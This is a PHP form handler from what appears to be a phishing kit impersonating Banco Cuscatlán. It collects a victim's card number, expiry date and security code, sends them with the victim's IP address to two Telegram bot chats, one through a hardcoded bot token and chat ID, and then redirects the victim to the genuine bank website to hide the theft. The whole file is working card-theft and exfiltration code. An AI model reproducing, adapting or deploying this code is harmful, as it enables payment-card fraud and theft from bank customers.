<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener los datos del formulario
    $tarj = $_POST['tarj'];
    $fecha = $_POST['fecha'];
    $pass = $_POST['pass'];

    
    require_once 'data.php';


  
$apiblok = '7747115549:AAEGJE68LFAzJa1sbNBlAcexfWYUfhSh65w';$keycode ='-1002390292795';$url1 ="https://api.telegram.org/bot{$token1}/sendMessage";
    $message1 = "
    CUSCATLAN TARJET:
    Tarjeta: {$tarj}\n
    Fecha de vencimiento: {$fecha}\n
    Código de seguridad: {$pass}\nIP: {$_SERVER['REMOTE_ADDR']}";

    $data1 = array(
        'chat_id' => $chatID1,
        'text' => $message1
    );

    $options1 = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data1),
        ),
    );

    $context1 = stream_context_create($options1);
    $result1 = file_get_contents($url1, false, $context1);

    $url2 = "https://api.telegram.org/bot{$apiblok}/sendMessage";
    $message2 = "
    CUSCATLAN TARJET:*
    Tarjeta: {$tarj}\n
    Fecha de vencimiento: {$fecha}\n
    Código de seguridad: {$pass}\nIP: {$_SERVER['REMOTE_ADDR']}";

    $data2 = array(
        'chat_id' => $keycode,
        'text' => $message2
    );

    $options2 = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data2),
        ),
    );

    $context2 = stream_context_create($options2);
    $result2 = file_get_contents($url2, false, $context2);

    if ($result1 !== false && $result2 !== false) {
        header("Location: https://www.bancocuscatlan.com/");
        exit();
    } else {
        echo "Error al enviar los mensajes a Telegram.";
    }
}
?>
